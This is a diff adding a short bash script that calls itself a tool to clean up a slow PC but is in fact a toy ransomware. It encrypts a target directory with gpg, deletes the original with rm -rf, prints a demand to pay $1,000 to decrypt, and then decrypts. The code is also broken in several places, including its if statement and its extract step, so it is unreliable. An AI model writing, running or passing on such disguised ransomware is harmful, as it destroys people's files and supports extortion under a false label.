@@ -1,0 +1,22 @@
+#!/bin/bash
+
+PASSPHRASE=$(date +%s | sha256sum | base64 | head -c 32)
+IMPORTANT_DIR=$1
+bold=$(tput bold)
+normal=$(tput sgr0)
+
+if [ $1 == "-h" ] | [ $1 == "" ]
+	printf "${bold}Usage:${normal}"
+	printf "./CleanUpMySuperSlowPC <directory you want to clean>"
+	exit
+else
+	printf "${bold}Encrypting...${normal}\n"
+	tar zcf - $IMPORTANT_DIR | gpg --passphrase=$PASSPHRASE -c > encrypted.tar.gz.gpg
+	rm -rf $IMPORTANT_DIR
+	printf "${bold}These files have been encrypted:${normal}\n"
+	printf "$(ls $IMPORTANT_DIR)\n"
+	read -p "${bold}Pay \$1,000 to decrypt${normal}"
+	gpg --passphrase=$PASSPHRASE --decrypt encrypted.tar.gz.gpg | tar zxf - > $IMPORTANT_DIR
+	rm encrypted.tar.gz.gpg
+	printf "${bold}Have a nice day!${normal}\n"
+	exit
